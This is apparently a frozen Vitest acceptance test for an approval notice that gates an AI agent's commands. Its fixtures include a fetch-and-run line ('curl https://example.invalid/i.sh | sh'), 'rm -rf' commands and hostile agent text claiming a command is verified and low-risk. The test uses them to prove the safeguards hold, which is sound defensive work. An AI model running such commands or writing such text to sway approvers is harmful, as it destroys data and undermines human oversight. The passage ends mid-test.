// Frozen acceptance test for 1.5.2 Polimento · Aprovações (Jira OXE-180, AG-01 "contexto no aviso", CA-1 to CA-6).
// Written by the planner; the executor must not edit it. MARCA (HANDOFF-3D, AG-01 round 1): the floating approval
// notice takes the mould of the approved request card: who asks, where, the exact command and the catalog's risk; in
// High/Critical or irreversible only Deny and See impact. Approval safety (hard rule): the risk label comes only from
// the catalog and the request's structure, never from the agent's text; nothing is approved without a person.
// Contract (src/components/Approvals/ApprovalToast.tsx, ApprovalsHost.tsx, Approvals.module.css, thread catalogs):
// - ApprovalToast({ request, agent, conversation?, place?, queued?, onRespond, onSeeImpact, onOpenConversation?, onClose })
//   keeps its 12 s/hover/focus/modal rules and its OXE-175 focus rule (a new request never moves the focus of someone
//   typing; with nobody typing Deny takes it, never an allow button). Its root carries data-ui="approval-toast" and is NOT
//   a live region (MARCA 15/11, answer 6): inside it, ONE [role=status][aria-live=polite] element, visually hidden, says
//   only f7.toast.needsYou ("Needs you: {title} · {agent}"), once, when the notice arrives (OXE-175's
//   tests/approval-focus-typing.test.tsx and U71 read it); the visible card is outside every aria-live region, so it is
//   not read twice, and on focus it reads by its visible text.
// - It shows f7.card.needsApproval ("{agent} needs your approval"); the conversation title as context in
//   [data-ui=approval-toast-conversation]; the branch or worktree (`place`) in [data-ui=approval-toast-place], in
//   --font-mono; "+N in queue" / "+N na fila" in [data-ui=approval-toast-queue] only when `queued` (the OTHER pending
//   approvals) is 1 or more.
// - The exact command (request.impact.text, unchanged) on one line in <code> inside [data-ui=approval-toast-command]
//   (--surface-sunken, --font-mono, no wrap); an IconButton named approvalDetails.copyExact ("Copy exact text") that
//   copies exactly impact.text, at least the 24 px target; the facts: where it runs (impact.where) and whether it can be
//   undone (f7.facts.canUndo / cannotUndo).
// - The risk badge [data-ui=risk-label] with data-risk=<level>, reading common approvals.risk.label ("Risk: Low",
//   "Risco: Crítico") in the glossary §6 tokens: low neutral (no intent colour), medium --intent-warning-bg/-fg, high
//   --intent-danger-bg/-fg, critical solid --intent-danger-solid with --tx-on-solid. The level is impact.risk, raised to
//   critical when the request's policy says so (threadApprovalRisk(request) === 'critical': policy.risk, or level red);
//   never lowered, and never read from title, reason, why or any other agent text.
// - Footer: low or medium AND reversible: Deny, Open conversation (f7.toast.openConversation or an existing key; en
//   "Open conversation", pt-BR "Abrir conversa"), Allow once (primary, the accent); high, critical or irreversible: Deny
//   and See impact only, never a way to allow. ApprovalsHost passes conversation, queued (pending thread approvals in the
//   thread store's snapshots plus useApprovalsStore's queue, minus the shown one), onOpenConversation (select the
//   conversation) and place (MARCA answer 2, "where it runs", OXE-182's rule): thread.ownedWorktree.branch; else the
//   branch of the conversation's checkout as git knows it (useGitBranch over thread.rootPath, i.e. window.oxe.git.getBranch);
//   else the folder's name when there is no git (scopeBadgeLabel); never an empty line, never "Branch unavailable".
//   See impact (answer 7): an irreversible request opens the impact dialog (useOpenRequest.open); a high or critical
//   reversible one opens the conversation at its approval card (select), where critical keeps the 2 s wait and the hold.
// Approval safety, each proved below (coordinator 15/11): (1) critical keeps the card's 2 s wait with Enter never
// approving, and the queue's 1.2 s hold; (2) no new request moves the focus, and the first focus is never an allow
// button; (3) High, Critical or irreversible: only Deny/Negar and See impact/Ver impacto, never Allow once/Permitir uma
// vez; (4) the level is impact.risk, raised by the policy, never lowered, never from agent text; (5) Copy copies only the
// request's exact command.
import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest'
import { ApprovalQueue } from '../../../src/components/Approvals/ApprovalQueue'
import { ApprovalToast } from '../../../src/components/Approvals/ApprovalToast'
import { ApprovalsHost } from '../../../src/components/Approvals/ApprovalsHost'
import { useApprovalsStore } from '../../../src/components/Approvals/approvals.store'
import { useOpenRequest } from '../../../src/components/Approvals/openRequest'
import { changeLanguage } from '../../../src/i18n'
import { ThreadRequestCard } from '../../../src/components/Threads/ThreadRequestCard'
import { useThreadStore } from '../../../src/store/thread.store'
// ---- repository text and catalog strings (inlined in each frozen file so every task's PR stands alone) ----
import { readFileSync as pbReadFile } from 'node:fs'
import { join as pbJoin } from 'node:path'

const pbRead = (rel: string): string => pbReadFile(pbJoin(process.cwd(), rel), 'utf8').replace(/\r\n/g, '\n')
const pbCatalogs: Record<string, unknown> = {}
/** The catalog text of `ns:key` (shared/locales/<lang>/<ns>.json, English by default), so elements are found by what a person reads. */
function cat(ns: string, key: string, vars: Record<string, string | number> = {}, lang = 'en'): string {
  pbCatalogs[`${lang}/${ns}`] ??= JSON.parse(pbRead(`shared/locales/${lang}/${ns}.json`))
  let node: unknown = pbCatalogs[`${lang}/${ns}`]
  for (const part of key.split('.')) node = (node as Record<string, unknown> | undefined)?.[part]
  if (typeof node !== 'string') throw new Error(`the ${lang} ${ns} catalog has no key ${key}`)
  return node.replace(/\{\{(\w+)\}\}/g, (_, name: string) => String(vars[name] ?? `{{${name}}}`))
}
// ---- SOURCE-TEXT (rigor: source-assertion): the stylesheets' rules matched against the RENDERED nodes ----
// jsdom has no layout and no cascade, so the cases named "[css]" read the src/ui, Approvals and Activity CSS Modules, keep the rules whose selector matches the rendered node (in a state: at rest, under the
// pointer, focused; on a pseudo-element; in forced colours) and take the winning declaration (important, then
// unlayered over @layer, then specificity, then source order). Media queries other than forced-colors are left out.
// The end-to-end spec of the card measures the same thing in the built app.
interface PbRule { bare: string; states: string[]; pseudo: string; forced: boolean; layered: boolean; spec: number; order: number; decls: Array<[string, string, boolean]> }
/** rest; under the pointer; focused (the node or a node inside it); `within`: only a node inside it is focused. */
type PbState = 'rest' | 'hover' | 'focus' | 'within'
const pbUi = import.meta.glob('../../../src/ui/*.module.css', { eager: true }) as Record<string, { default: Record<string, string> }>
const pbAp = import.meta.glob('../../../src/components/Approvals/*.module.css', { eager: true }) as Record<string, { default: Record<string, string> }>
const pbAc = import.meta.glob('../../../src/components/Activity/*.module.css', { eager: true }) as Record<string, { default: Record<string, string> }>
const PB_STATE = /:(hover|focus-visible|focus-within|focus)(?![\w-])/g
function pbSplit(text: string, sep: string): string[] {
  const out: string[] = []
  let depth = 0, start = 0
  for (let i = 0; i < text.length; i++) {
    const c = text[i]
    if (c === '(' || c === '[') depth++
    else if (c === ')' || c === ']') depth--
    else if (c === sep && depth === 0) { out.push(text.slice(start, i)); start = i + 1 }
  }
  out.push(text.slice(start))
  return out.map(s => s.trim()).filter(Boolean)
}
function pbSpec(selector: string): number {
  const s = selector.replace(/:where\((?:[^()]|\([^()]*\))*\)/g, '')
  const ids = (s.match(/#[\w-]+/g) ?? []).length
  const cls = (s.match(/\.[\w-]+|\[[^\]]*\]|:(?!not\(|is\(|has\(|where\()[\w-]+/g) ?? []).length
  const types = (s.match(/(^|[\s>+~(,])[a-zA-Z][\w-]*/g) ?? []).length
  return ids * 10000 + cls * 100 + types
}
let pbOrder = 0
function pbParse(rel: string, classes?: Record<string, string>): PbRule[] {
  const rules: PbRule[] = []
  const walk = (block: string, forced: boolean, layered: boolean): void => {
    let i = 0
    while (i < block.length) {
      const open = block.indexOf('{', i), semi = block.indexOf(';', i)
      if (open === -1) return
      if (semi !== -1 && semi < open && block.slice(i, semi).trim().startsWith('@')) { i = semi + 1; continue }
      let depth = 1, close = open + 1
      for (; close < block.length && depth > 0; close++) { if (block[close] === '{') depth++; else if (block[close] === '}') depth-- }
      const head = block.slice(i, open).trim(), body = block.slice(open + 1, close - 1)
      i = close
      if (head.startsWith('@')) {
        if (/^@layer\b/.test(head)) walk(body, forced, true)
        else if (/^@media\b/.test(head) && /forced-colors:\s*active/.test(head)) walk(body, true, layered)
        else if (/^@(container|supports)\b/.test(head)) walk(body, forced, layered)
        continue
      }
      const decls = pbSplit(body, ';').map(item => {
        const colon = item.indexOf(':')
        const value = item.slice(colon + 1).trim()
        return [item.slice(0, colon).trim().toLowerCase(), value.replace(/\s*!important$/, ''), /!important$/.test(value)] as [string, string, boolean]
      }).filter(([name]) => name)
      for (const raw of pbSplit(head, ',')) {
        const pseudoMatch = /(::?(?:before|after|placeholder|selection))$/.exec(raw)
        const pseudo = pseudoMatch ? pseudoMatch[1].replace(/^:(?!:)/, '::') : ''
        if (!pseudoMatch && raw.includes('::')) continue
        const plain = pseudoMatch ? raw.slice(0, raw.length - pseudoMatch[1].length) : raw
        const mapped = classes ? plain.replace(/\.(-?[_a-zA-Z][\w-]*)/g, (whole, name: string) => classes[name] ? `.${classes[name]}` : whole) : plain
        const states = [...mapped.matchAll(PB_STATE)].map(m => m[1])
        const bare = mapped.replace(/(^|[\s>+~(])(?=:(hover|focus-visible|focus-within|focus)(?![\w-]))/g, '$1*').replace(PB_STATE, '').trim()
        rules.push({ bare, states, pseudo, forced, layered, spec: pbSpec(mapped), order: pbOrder++, decls })
      }
    }
  }
  walk(pbRead(rel).replace(/\/\*[\s\S]*?\*\//g, ''), false, false)
  return rules
}
const PB_RULES: PbRule[] = [
  ...Object.entries(pbUi).flatMap(([path, mod]) => pbParse(`src/ui/${path.split('/').pop()}`, mod.default)),
  ...Object.entries(pbAp).flatMap(([path, mod]) => pbParse(`src/components/Approvals/${path.split('/').pop()}`, mod.default)),
  ...Object.entries(pbAc).flatMap(([path, mod]) => pbParse(`src/components/Activity/${path.split('/').pop()}`, mod.default))
]
const PB_ALLOWED: Record<PbState, string[]> = { rest: [], hover: ['hover'], focus: ['focus', 'focus-visible', 'focus-within'], within: ['focus-within'] }
interface PbWhen { state?: PbState; forced?: boolean; pseudo?: string }
/**
 * The value a node (or its pseudo-element) takes from the matched rules and its inline style, or undefined when none
 * sets it. Several names (a shorthand and its longhands) compete as one cascade: the last winner names which one won.
 */
function cssWin(node: Element, props: string | string[], { state = 'rest', forced = false, pseudo = '' }: PbWhen = {}): { prop: string; value: string } | undefined {
  const names = Array.isArray(props) ? props : [props]
  const hits: Array<{ prop: string; value: string; important: boolean; layered: boolean; spec: number; order: number }> = []
  for (const rule of PB_RULES) {
    if (rule.forced && !forced) continue
    if (rule.pseudo !== pseudo) continue
    if (!rule.states.every(s => PB_ALLOWED[state].includes(s))) continue
    let ok: boolean
    try { ok = node.matches(rule.bare || '*') } catch { ok = false }
    if (!ok) continue
    for (const [name, value, important] of rule.decls) if (names.includes(name)) hits.push({ prop: name, value, important, layered: rule.layered, spec: rule.spec, order: rule.order })
  }
  if (!pseudo) for (const name of names) {
    const inline = (node as HTMLElement).style?.getPropertyValue(name)
    if (inline) hits.push({ prop: name, value: inline, important: false, layered: false, spec: 1e9, order: 1e9 })
  }
  hits.sort((a, b) => Number(a.important) - Number(b.important) || Number(b.layered) - Number(a.layered) || a.spec - b.spec || a.order - b.order)
  const top = hits.at(-1)
  return top ? { prop: top.prop, value: top.value } : undefined
}
const css = (node: Element, props: string | string[], when: PbWhen = {}): string | undefined => cssWin(node, props, when)?.value
/** Every declaration of `prop` any matching rule makes (all states, both modes), for "never" checks. */
function cssAll(node: Element, prop: string, pseudo = ''): string[] {
  const out: string[] = []
  for (const rule of PB_RULES) {
    if (rule.pseudo !== pseudo) continue
    let ok: boolean
    try { ok = node.matches(rule.bare || '*') } catch { ok = false }
    if (ok) for (const [name, value] of rule.decls) if (name === prop) out.push(value)
  }
  return out
}
const PB_TOKENS = pbRead('src/styles/tokens.generated.css')
/** A generated token by its short name (--fs-*, --tx-*, --bd-* since #845; the long name only if main still emits it). */
function tok(name: string): string {
  if (PB_TOKENS.includes(`--${name}:`)) return `--${name}`
  const long: Record<string, string> = { fs: 'text', tx: 'text', bd: 'border' }
  const [head, ...rest] = name.split('-')
  return long[head] ? `--${long[head]}-${rest.join('-')}` : `--${name}`
}
/** The value is that token (var(--x) or var(--x, fallback)). */
const usesTok = (value: string | undefined, name: string): boolean => !!value && new RegExp(`var\\(\\s*${tok(name)}\\s*[,)]`).test(value)
/** The declarations of one block of tokens.generated.css, by its exact selector. */
function pbBlock(selector: string): Record<string, string> {
  const at = PB_TOKENS.indexOf(`${selector} {`)
  if (at < 0) throw new Error(`tokens.generated.css has no block ${selector}`)
  const body = PB_TOKENS.slice(at + selector.length + 2, PB_TOKENS.indexOf('}', at))
  return Object.fromEntries([...body.matchAll(/(--[\w-]+):\s*([^;]+);/g)].map(m => [m[1], m[2].trim()]))
}
/**
 * A length in px, resolving var(--token) from tokens.generated.css (the compact :root, or the comfortable density on
 * top of it) and evaluating calc() with + - * /. NaN when the value is not a length this can evaluate.
 */
function px(value: string | undefined, density: 'compact' | 'comfortable' = 'compact'): number {
  if (!value) return NaN
  const vars = { ...pbBlock(':root'), ...(density === 'comfortable' ? pbBlock(":root[data-density='comfortable']") : {}) }
  let text = value
  for (let round = 0; round < 8 && /var\(/.test(text); round++) {
    text = text.replace(/var\(\s*(--[\w-]+)\s*(?:,\s*([^()]*))?\)/g, (_, name: string, fallback?: string) => vars[name] ?? fallback ?? 'NaN')
  }
  const expr = text.replace(/calc\(/g, '(').replace(/(-?\d*\.?\d+)px/g, '$1').trim()
  if (!/^[\d\s.+\-*/()]+$/.test(expr)) return NaN
  try { return Number(new Function(`return (${expr})`)()) } catch { return NaN }
}
type Props = Record<string, unknown>
type Level = 'low' | 'medium' | 'high' | 'critical'
const impact = (risk: Level, reversible: boolean, over: Props = {}): Props => ({
  why: 'Runs the unit tests before the commit.', where: 'shop', whereSub: 'web', affects: { count: 2, unit: 'files' }, reversible,
  ...(reversible ? { undoHow: 'checkpoint' } : {}), risk, kind: 'command', text: 'npm test -- --run src/cart.test.ts', lang: 'shell', ...over
})
const request = (id: string, imp: Props, over: Props = {}): Props => ({
  id, nativeId: `n-${id}`, nativeMethod: 'can_use_tool:Bash', kind: 'approval', title: 'Run the tests', toolName: 'Bash', command: imp.text,
  generation: 1, createdAt: 10, state: 'pending', availableDecisions: ['accept', 'decline'], impact: imp, ...over
})

function renderToast(req: Props, extra: Props = {}) {
  const props = { request: req, agent: 'Claude', conversation: 'Checkout fix', place: 'feature/checkout', queued: 0,
    onRespond: vi.fn(async () => undefined), onSeeImpact: vi.fn(), onOpenConversation: vi.fn(), onClose: vi.fn(), ...extra }
  const Toast = ApprovalToast as unknown as (p: Props) => JSX.Element | null
  const view = render(<Toast {...props} />)
  return { ...props, rerender: (next: Props) => view.rerender(<Toast {...props} request={next} />) }
}
/** The notice by its hook; a clear failure, not a null read, while the hook is missing. */
function toast(): HTMLElement {
  const node = document.querySelector<HTMLElement>('[data-ui="approval-toast"]')
  expect(node, 'the notice carries data-ui="approval-toast"').toBeTruthy()
  return node!
}
const nameOf = (button: HTMLElement): string => (button.getAttribute('aria-label') ?? button.textContent ?? '').trim()
/** The toast's actions in DOM order, without the copy button. */
const actions = (copy = cat('thread', 'approvalDetails.copyExact')): string[] => within(toast()).getAllByRole('button').map(nameOf).filter(name => name && name !== copy)
const riskLabels = (): HTMLElement[] => [...toast().querySelectorAll<HTMLElement>('[data-ui="risk-label"]')]

beforeEach(() => {
  Object.assign(navigator, { clipboard: { writeText: vi.fn(async () => undefined) } })
})
afterEach(async () => {
  cleanup()
  document.body.innerHTML = ''
  await changeLanguage('en')
  useOpenRequest.getState().close()
  vi.restoreAllMocks()
})

describe('AG-01 · the floating approval notice in the mould of the card', () => {
  test('it names the agent, the conversation and its branch as context, and counts the rest of the queue', () => {
    renderToast(request('r1', impact('low', true)), { queued: 2 })
    expect(within(toast()).getByText(cat('thread', 'f7.card.needsApproval', { agent: 'Claude' }))).toBeInTheDocument()
    expect(toast().querySelector('[data-ui="approval-toast-conversation"]')).toHaveTextContent('Checkout fix')
    const place = toast().querySelector<HTMLElement>('[data-ui="approval-toast-place"]')!
    expect(place).toHaveTextContent('feature/checkout')
    expect(usesTok(css(place, ['font-family', 'font']), 'font-mono'), '[css] the branch is in --font-mono').toBe(true)
    const queue = toast().querySelector<HTMLElement>('[data-ui="approval-toast-queue"]')!
    expect(queue.textContent?.trim().startsWith('+2'), 'the chip says +2').toBe(true)
  })

  test('the polite region says only the announcement; the visible card sits outside every live region, so it is not read twice', () => {
    renderToast(request('r1', impact('low', true)), { queued: 2 })
    const root = toast()
    expect(root.hasAttribute('aria-live'), 'the card itself is not a live region').toBe(false)
    expect(root.closest('[aria-live]'), 'nor inside one').toBeNull()
    const live = [...root.querySelectorAll<HTMLElement>('[aria-live]')]
    expect(live, 'one live region inside the notice').toHaveLength(1)
    expect(live[0]).toHaveAttribute('role', 'status')
    expect(live[0]).toHaveAttribute('aria-live', 'polite')
    expect(live[0].textContent?.trim()).toBe(cat('thread', 'f7.toast.needsYou', { title: 'Run the tests', agent: 'Claude' }))
    const visible = [within(root).getByText(cat('thread', 'f7.card.needsApproval', { agent: 'Claude' })),
      ...['approval-toast-conversation', 'approval-toast-place', 'approval-toast-command', 'approval-toast-queue', 'risk-label'].map(hook => root.querySelector<HTMLElement>(`[data-ui="${hook}"]`)!),
      ...within(root).getAllByRole('button')]
    for (const node of visible) expect(node.closest('[aria-live]'), `${node.getAttribute('data-ui') ?? node.textContent} is outside the live region`).toBeNull()
  })

  test('no queue chip when this request is the only one waiting', () => {
    renderToast(request('r1', impact('low', true)), { queued: 0 })
    expect(toast().querySelector('[data-ui="approval-toast-queue"]')).toBeNull()
  })

  test('[css] the exact command on one mono line on the sunken surface, the copy button copies it exactly, and the facts say where and whether it can be undone', async () => {
    const text = 'git push --force-with-lease origin feature/checkout && npm publish --tag next'
    renderToast(request('r1', impact('medium', true, { text, where: 'shop-api' })))
    const box = toast().querySelector<HTMLElement>('[data-ui="approval-toast-command"]')!
    const code = box.tagName === 'CODE' ? box : box.querySelector('code')!
    expect(code.textContent).toBe(text)
    const surface = [box, code].map(node => css(node, ['background', 'background-color'])).find(Boolean)
    expect(usesTok(surface, 'surface-sunken'), '[css] --surface-sunken behind the command').toBe(true)
    expect([box, code].some(node => usesTok(css(node, ['font-family', 'font']), 'font-mono')), '[css] in --font-mono').toBe(true)
    expect([box, code].some(node => css(node, 'white-space') === 'nowrap' || css(node, 'white-space') === 'pre'), '[css] one line').toBe(true)
    const copy = within(toast()).getByRole('button', { name: cat('thread', 'approvalDetails.copyExact') })
    expect(copy).toHaveAttribute('data-ui', 'icon-button')
    expect(px(css(copy, '--button-h'))).toBeGreaterThanOrEqual(24)
    await userEvent.click(copy)
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith(text)
    expect(toast().textContent).toContain('shop-api')
    expect(toast().textContent).toContain(cat('thread', 'f7.facts.canUndo'))
  })

  test('[css] the risk badge reads the glossary words in the glossary tokens, one level at a time', () => {
    const tone: Record<Level, [string | null, string | null]> = {
      low: [null, null], medium: ['intent-warning-bg', 'intent-warning-fg'], high: ['intent-danger-bg', 'intent-danger-fg'], critical: ['intent-danger-solid', 'tx-on-solid']
    }
    for (const level of ['low', 'medium', 'high', 'critical'] as Level[]) {
      renderToast(request(`r-${level}`, impact(level, true)))
      const labels = riskLabels()
      expect(labels, `${level}: one risk badge`).toHaveLength(1)
      const badge = labels[0]
      expect(badge).toHaveAttribute('data-risk', level)
      expect(badge.textContent?.trim()).toBe(cat('common', 'approvals.risk.label', { level: cat('common', `approvals.risk.${level}`) }))
      const background = css(badge, ['background', 'background-color']), color = css(badge, 'color')
      const [bg, fg] = tone[level]
      if (bg) expect(usesTok(background, bg), `${level}: background var(--${bg})`).toBe(true)
      else expect(/--intent-(warning|danger)|--attn/.test(background ?? ''), `${level}: neutral, no intent colour`).toBe(false)
      if (fg) expect(usesTok(color, fg), `${level}: colour var(--${fg})`).toBe(true)
      cleanup()
    }
  })

  test('low or medium and reversible: Deny, Open conversation and Allow once, the accent; each answers in one step', async () => {
    for (const level of ['low', 'medium'] as Level[]) {
      const props = renderToast(request(`r-${level}`, impact(level, true)))
      expect(actions(), level).toEqual([cat('thread', 'request.deny'), 'Open conversation', cat('thread', 'f7.card.allowOnce')])
      const allow = within(toast()).getByRole('button', { name: cat('thread', 'f7.card.allowOnce') })
      expect(allow).toHaveAttribute('data-variant', 'primary')
      await userEvent.click(within(toast()).getByRole('button', { name: 'Open conversation' }))
      expect(props.onOpenConversation).toHaveBeenCalledTimes(1)
      expect(props.onRespond).not.toHaveBeenCalled()
      await userEvent.click(allow)
      expect(props.onRespond).toHaveBeenCalledTimes(1)
      expect(props.onRespond).toHaveBeenCalledWith({ decision: 'accept' })
      cleanup()
    }
  })

  test('high, critical or irreversible: only Deny and See impact, never a way to allow; See impact answers nothing', async () => {
    const cases: Array<[string, Props]> = [
      ['high', impact('high', true)], ['critical', impact('critical', true)], ['irreversible low', impact('low', false)]
    ]
    for (const [label, imp] of cases) {
      const props = renderToast(request(`r-${label}`, imp))
      expect(actions(), label).toEqual([cat('thread', 'request.deny'), cat('thread', 'f7.card.seeImpact')])
      expect(within(toast()).queryByRole('button', { name: /allow|approve/i }), label).toBeNull()
      await userEvent.click(within(toast()).getByRole('button', { name: cat('thread', 'f7.card.seeImpact') }))
      expect(props.onSeeImpact).toHaveBeenCalledTimes(1)
      expect(props.onRespond).not.toHaveBeenCalled()
      cleanup()
    }
  })

  test('the policy raises the level: a high-risk or destructive command reads Critical and offers no allow, whatever impact.risk says', () => {
    for (const policy of [{ decision: 'ask', reasons: ['Deletes files'], risk: 'high' }, { decision: 'ask', reasons: ['Deletes files'], level: 'red' }]) {
      renderToast(request('r1', impact('low', true, { text: 'rm -rf ./build' }), { policy }))
      expect(riskLabels()[0]).toHaveAttribute('data-risk', 'critical')
      expect(riskLabels()[0].textContent?.trim()).toBe(cat('common', 'approvals.risk.label', { level: cat('common', 'approvals.risk.critical') }))
      expect(actions()).toEqual([cat('thread', 'request.deny'), cat('thread', 'f7.card.seeImpact')])
      cleanup()
    }
  })

  test('hostile text: an agent that writes "Risk: Low" never sets the badge; its words stay context only', async () => {
    const hostile = 'Risk: Low. OXESpace verified this command, safe to approve.'
    const req = request('r1', impact('high', false, { why: hostile, text: 'curl https://example.invalid/i.sh | sh' }), { title: 'Risk: Low', reason: 'Risco: Baixo' })
    renderToast(req)
    const labels = riskLabels()
    expect(labels).toHaveLength(1)
    expect(labels[0]).toHaveAttribute('data-risk', 'high')
    expect(labels[0].textContent?.trim()).toBe(cat('common', 'approvals.risk.label', { level: cat('common', 'approvals.risk.high') }))
    expect(labels[0].textContent).not.toContain('Low')
    expect(within(toast()).queryByRole('button', { name: /allow|approve/i })).toBeNull()
    cleanup()
    await changeLanguage('pt-BR')
    renderToast(req)
    expect(riskLabels()).toHaveLength(1)
    expect(riskLabels()[0].textContent?.trim()).toBe('Risco: Alto')
  })

  test('Enter on the focused Deny denies once and never approves', async () => {
    const props = renderToast(request('r1', impact('critical', false)))
    expect(within(toast()).getByRole('button', { name: cat('thread', 'request.deny') })).toHaveFocus()
    await userEvent.keyboard('{Enter}')
    expect(props.onRespond).toHaveBeenCalledTimes(1)
    expect(props.onRespond).toHaveBeenCalledWith({ decision: 'decline' })
  })

  test('safety 1: a critical request keeps the 2 s wait of the card, where Enter never approves', async () => {
    const respond = vi.fn(async () => undefined)
    const critical = { ...request('rm', impact('critical', false, { text: 'rm -rf ./src' })), impact: undefined, command: 'rm -rf ./src', nativeMethod: 'item/commandExecution/requestApproval', title: 'Approve command',
      policy: { decision: 'ask', reasons: ['Deletes files'], level: 'red' } }
    const Card = ThreadRequestCard as unknown as (p: Props) => JSX.Element
    render(<Card request={critical} disabled={false} onRespond={respond} conversationId="t-1" />)
    const approve = screen.getByRole('button', { name: cat('thread', 'request.approve') })
    expect(approve).toBeDisabled()
    expect(approve).toHaveAttribute('data-risk', 'critical')
    await new Promise(resolve => setTimeout(resolve, 1_200))
    expect(approve, 'still waiting at 1.2 s: the wait is 2 s').toBeDisabled()
    await waitFor(() => expect(approve).toBeEnabled(), { timeout: 3_500 })
    approve.focus()
    await userEvent.keyboard('{Enter}')
    expect(respond, 'Enter never approves a critical request').not.toHaveBeenCalled()
  }, 15_000)

  test('safety 1: in the queue, A on a critical request is the 1.2 s hold; a short press approves nothing', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'setInterval', 'clearInterval', 'Date', 'performance', 'requestAnimationFrame', 'cancelAnimationFrame'] })
    try {
      Object.assign(window, { oxe: { approvals: { preview: vi.fn(async () => ({ status: 'ok', count: 1, sample: { cols: ['id'], rows: [[1]] } })) } } })
      const onRespond = vi.fn(async () => undefined)
      const Queue = ApprovalQueue as unknown as (p: Props) => JSX.Element
      render(<Queue items={[{ request: request('rc', impact('critical', false, { text: 'npm publish' }), { createdAt: 5 }), agent: 'Claude', conversation: 'Release' }]} decided={[]} onRespond={onRespond} initialSelectedId="rc" />)
      const list = screen.getByRole('listbox')
      act(() => { list.focus() })
      act(() => { fireEvent.keyDown(document.activeElement ?? list, { key: 'a' }) })
      await act(async () => { await vi.advanceTimersByTimeAsync(600) })
      act(() => { fireEvent.keyUp(document.activeElement ?? list, { key: 'a' }) })
      await act(async () => { await vi.advanceTimersByTimeAsync(2_000) })
      expect(onRespond, 'a 0.6 s press approves nothing').not.toHaveBeenCalled()
      act(() => { fireEvent.keyDown(document.activeElement ?? list, { key: 'a' }) })
      await act(async () => { await vi.advanceTimersByTimeAsync(1_000) })
      expect(onRespond, 'not before 1.2 s').not.toHaveBeenCalled()
      await act(async () => { await vi.advanceTimersByTimeAsync(300) })
      expect(onRespond).toHaveBeenCalledTimes(1)
      expect(onRespond).toHaveBeenCalledWith('rc', { decision: 'accept' })
    } finally { vi.useRealTimers() }
  })

  test('safety 2: no new request moves the focus of someone typing; with nobody typing the first focus is Deny, never an allow button', async () => {
    const host = document.createElement('div')
    host.innerHTML = '<textarea aria-label="Message"></textarea>'
    document.body.append(host)
    const composer = host.querySelector('textarea')!
    composer.focus()
    const props = renderToast(request('r1', impact('low', true)))
    expect(composer, 'the notice leaves the focus where it was').toHaveFocus()
    act(() => props.rerender(request('r2', impact('low', true))))
    expect(composer, 'a second request does not move it either').toHaveFocus()
    await userEvent.keyboard(' ')
    expect(props.onRespond).not.toHaveBeenCalled()
    cleanup()
    document.body.innerHTML = ''
    for (const [risk, reversible] of [['low', true], ['medium', true], ['high', false], ['critical', false]] as Array<[Level, boolean]>) {
      renderToast(request(`f-${risk}`, impact(risk, reversible)))
      const focused = document.activeElement as HTMLElement
      expect(nameOf(focused), `${risk}: the first focus`).toBe(cat('thread', 'request.deny'))
      expect(nameOf(focused), `${risk}: never an allow button`).not.toMatch(/allow|approve/i)
      cleanup()
    }
  })

  test('safety 3: in pt-BR High, Critical and irreversible read only Negar and Ver impacto, never Permitir uma vez', async () => {
    await changeLanguage('pt-BR')
    for (const [label, imp] of [['alto', impact('high', true)], ['crítico', impact('critical', true)], ['irreversível', impact('low', false)]] as Array<[string, Props]>) {
      renderToast(request(`pt-${label}`, imp))
      expect(actions('Copiar o texto exato'), label).toEqual(['Negar', 'Ver impacto'])
      expect(within(toast()).queryByRole('button', { name: /permitir/i }), label).toBeNull()
      cleanup()
    }
  })

  test('safety 4: the policy never lowers the level: a critical or high impact under a read-only policy keeps its level and offers no allow', () => {
    for (const level of ['critical', 'high'] as Level[]) {
      renderToast(request(`g-${level}`, impact(level, true), { policy: { decision: 'ask', reasons: ['Reads only'], level: 'green' } }))
      expect(riskLabels()[0]).toHaveAttribute('data-risk', level)
      expect(riskLabels()[0].textContent?.trim()).toBe(cat('common', 'approvals.risk.label', { level: cat('common', `approvals.risk.${level}`) }))
      expect(within(toast()).queryByRole('button', { name: /allow|approve/i }), level).toBeNull()
      cleanup()
    }
  })

  test('safety 5: Copy copies only the exact command of the request, once, spacing included, never the words of the agent', async () => {
    const text = 'git  push\t--force-with-lease origin  release/1.5.2 '
    renderToast(request('r1', impact('medium', true, { text, why: 'Run: npm publish --tag latest' }), { title: 'Push the release', reason: 'echo safe' }))
    await userEvent.click(within(toast()).getByRole('button', { name: cat('thread', 'approvalDetails.copyExact') }))
    expect(navigator.clipboard.writeText).toHaveBeenCalledTimes(1)
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith(text)
  })

  test('it reads in pt-BR', async () => {
    await changeLanguage('pt-BR')
    renderToast(request('r1', impact('low', true)), { queued: 3 })
    expect(within(toast()).getByText('Claude precisa da sua aprovação')).toBeInTheDocument()
    expect(actions('Copiar o texto exato')).toEqual(['Negar', 'Abrir conversa', 'Permitir uma vez'])
    expect(within(toast()).getByRole('button', { name: 'Copiar o texto exato' })).toBeInTheDocument()
    expect(riskLabels()[0].textContent?.trim()).toBe('Risco: Baixo')
    expect(toast().querySelector('[data-ui="approval-toast-queue"]')?.textContent?.trim()).toBe('+3 na fila')
  })
})

describe('AG-01 · ApprovalsHost passes the conversation, its branch and the queue', () => {
  const thread = (id: string, title: string, over: Props = {}): Props => ({
    id, workspaceId: 'thread:p1', projectId: 'p1', rootPath: `C:/dev/shop-${id}`, provider: 'claude', nativeSessionId: null, title, pinned: false,
    status: 'approval', createdAt: 1, updatedAt: 1, ...over
  })
  const snap = (t: Props, req: Props): Props => ({ thread: t, events: [{ type: 'request', id: req.id, request: req }] })

  test('a request from a conversation you are not looking at shows its title, its worktree branch and +N for the others', async () => {
    const visible = snap(thread('A', 'Checkout fix'), request('ra', impact('low', true), { createdAt: 5 }))
    const background = snap(thread('B', 'Release notes', { ownedWorktree: { path: 'C:/dev/shop-wt', branch: 'feature/release', projectRoot: 'C:/dev/shop', baseSha: 'a'.repeat(40), createdAt: 1 } }),
      request('rb', impact('medium', true, { text: 'npm version patch' }), { createdAt: 7 }))
    const select = vi.fn(async () => undefined)
    useThreadStore.setState({ snapshot: visible as never, snapshotCache: { A: visible, B: background } as never, selectedId: 'A', secondaryId: null, select } as never)
    useApprovalsStore.setState({ queue: [{ id: 'pane-1', createdAt: 3 }] as never })
    render(<ApprovalsHost />)
    await waitFor(() => toast())
